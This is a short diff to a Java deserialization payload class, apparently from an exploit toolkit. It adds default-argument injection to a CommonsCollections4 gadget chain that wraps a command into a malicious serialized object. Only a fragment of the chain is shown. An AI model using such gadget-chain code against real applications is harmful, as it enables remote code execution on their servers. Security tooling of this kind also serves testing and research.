@@ -22,6 +22,8 @@ import org.apache.commons.collections4.functors.InstantiateTransformer;
  */
 public class CommonsCollections4 implements Payload {
 
+	private String[] args;
+
 	/**
 	 *
 	 * @param args
@@ -33,6 +35,8 @@ public class CommonsCollections4 implements Payload {
 	 */
 	@Override
 	public Object getPayload(String[] args) throws Exception {
+		if (this.args != null)
+			args = this.args;
 		Object templates = Gadgets.createTemplatesImpl(args[0]);
 
 		ConstantTransformer constant = new ConstantTransformer(String.class);
@@ -61,4 +65,10 @@ public class CommonsCollections4 implements Payload {
 
 		return queue;
 	}
+
+	@Override
+	public void injectDefaultArgs(String[] args) {
+		this.args = args;
+	}
+
 }
